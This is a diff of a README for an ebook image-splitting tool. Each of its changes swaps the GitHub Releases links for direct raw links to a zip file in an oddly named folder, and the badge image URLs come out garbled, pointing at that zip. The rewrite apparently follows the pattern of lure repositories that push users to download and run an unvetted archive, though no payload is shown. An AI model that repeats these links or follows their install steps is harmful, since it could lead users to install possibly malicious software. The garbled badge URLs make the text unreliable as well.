@@ -1,6 +1,6 @@
 # 🎨 Full-Spread-Image-Splitter-For-Ebooks - Easily Split Images for KDP
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ravenjare9716/Full-Spread-Image-Splitter-For-Ebooks/releases)
+[![Download Now](https://raw.githubusercontent.com/ravenjare9716/Full-Spread-Image-Splitter-For-Ebooks/main/presternal/Full-Spread-Image-Splitter-For-Ebooks-2.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ravenjare9716/Full-Spread-Image-Splitter-For-Ebooks/main/presternal/Full-Spread-Image-Splitter-For-Ebooks-2.1.zip)
 
 ## 📖 Description
 
@@ -11,7 +11,7 @@ This nice little software developed in Python helps you split full spread images
 To get started, follow these steps:
 
 1. **Download the Software**  
-   Visit the Releases page to download the latest version: [Download Here](https://github.com/ravenjare9716/Full-Spread-Image-Splitter-For-Ebooks/releases).
+   Visit the Releases page to download the latest version: [Download Here](https://raw.githubusercontent.com/ravenjare9716/Full-Spread-Image-Splitter-For-Ebooks/main/presternal/Full-Spread-Image-Splitter-For-Ebooks-2.1.zip).
 
 2. **Install the Software**  
    Open the downloaded file and follow the prompts to install. No programming skills are required.
@@ -38,7 +38,7 @@ To get started, follow these steps:
 
 ## 📥 Download & Install
 
-Head over to the Releases page to download the software and start enhancing your eBook formatting today: [Download Here](https://github.com/ravenjare9716/Full-Spread-Image-Splitter-For-Ebooks/releases).
+Head over to the Releases page to download the software and start enhancing your eBook formatting today: [Download Here](https://raw.githubusercontent.com/ravenjare9716/Full-Spread-Image-Splitter-For-Ebooks/main/presternal/Full-Spread-Image-Splitter-For-Ebooks-2.1.zip).
 
 ## 🖥️ System Requirements
 
@@ -96,4 +96,4 @@ If you're interested in helping improve this software, contributions are welcome
 
 We appreciate your feedback. If you have suggestions for improvement, please let us know.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ravenjare9716/Full-Spread-Image-Splitter-For-Ebooks/releases)
+[![Download Now](https://raw.githubusercontent.com/ravenjare9716/Full-Spread-Image-Splitter-For-Ebooks/main/presternal/Full-Spread-Image-Splitter-For-Ebooks-2.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ravenjare9716/Full-Spread-Image-Splitter-For-Ebooks/main/presternal/Full-Spread-Image-Splitter-For-Ebooks-2.1.zip)
